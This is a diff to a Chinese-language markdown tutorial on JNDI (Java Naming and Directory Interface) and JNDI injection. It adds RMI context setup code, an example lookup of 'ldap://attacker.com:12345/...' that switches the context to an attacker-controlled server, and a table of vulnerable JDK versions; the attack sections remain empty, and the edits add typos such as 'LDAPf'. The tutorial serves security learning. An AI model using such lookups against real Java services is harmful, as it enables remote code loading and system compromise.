@@ -2,11 +2,11 @@
 
 ## 1.JNDI
 
-**JNDI(Java Naming Direcorty Interface) Java命令和目录接口**：一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义 用户、网络、机器、对象和服务等。
+**Java Naming Direcorty Interface(JNDI):Java命令和目录接口**：一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义 用户、网络、机器、对象和服务等。
 
 - JNDI支持的服务：
   - RMI
-  - LDAP
+  - LDAPf
   - DNS
   - CORBA
 
@@ -22,7 +22,7 @@
     - 命令服务中，对象没有属性。
   - 根据这个特性，目录服务中可以根据属性检索对象。
 - `Object Facotry`
-  - `Object Factory`用于将`Naming Service`中储存的数据转换为Java中表达的数据，如：Java中对象或者Java中的基本数据类型，每一个`Service Probider`可能配有多个`Object Factory`
+  - Object Factory 用于将Naming Service中储存的数据转换为Java中表达的数据，如：Java中对象或者Java中的基本数据类型，每一个Service Probider可能配有多个 Object Factory
 
 
 
@@ -70,7 +70,28 @@ Java为了实现将Object对象存储在Naming和Direcotry服务下，提供了N
 
 简单来说，不管是什么样的绑定，都可以通过ladp和rmi协议利用
 
+```
+    Properties env = new Properties();
+    env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
+    env.put(Context.PROVIDER_URL,"rmi://localhost:1099");
+    Context ctx = new InitialContext(env);
+--------------------------------------------------------------------
+    LocateRegistry.createRegistry(6666);
+    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
+    System.setProperty(Context.PROVIDER_URL, "rmi://localhost:6666");
+    InitialContext ctx = new InitialContext();
+```
 
+但是我们在调用`lookup`和`search`方法的时候，还可以使用带URL动态的转换上下文环境。
+
+举个例子：
+
+我们将JNDI的环境已经初始化配置为RMI了，但是我们在调用`lookup`方法的时候使用`ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");`
+
+| 协议 | JDK6   | JDK7   | JDK8   | JDK11   |
+| ---- | ------ | ------ | ------ | ------- |
+| LADP | <6u211 | <7u201 | <8u191 | <11.0.1 |
+| RMI  | <6u132 | <7u122 | <8u113 | 无      |
 
 ## 3.JNDI注入
 
@@ -78,7 +99,21 @@ Java为了实现将Object对象存储在Naming和Direcotry服务下，提供了N
 
 
 
+
+
+
+
+
+
+
+
+
+
 ### 3.2 ldap攻击
+
+
+
+
 
 
 
